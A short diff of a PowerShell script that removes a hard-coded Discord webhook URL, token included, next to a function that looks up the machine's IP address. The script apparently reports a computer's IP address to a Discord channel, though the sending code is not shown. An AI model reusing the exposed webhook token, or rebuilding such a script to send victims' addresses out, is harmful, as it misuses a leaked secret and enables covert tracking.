@@ -5,7 +5,7 @@ function Get-IPAddress {
 }
 
 # Discord webhook URL
-$dc = "https://discord.com/api/webhooks/1116817887349440522/3jS6qCFEZBVZwSvkMaoh5gHdn76_M0AQyhHqx5FlRHFyjEpLQ0hCvhN7jDB5R1f7IYfA"
+$dc = ""
 
 # Retrieve the IP address
 $IPAddress = Get-IPAddress
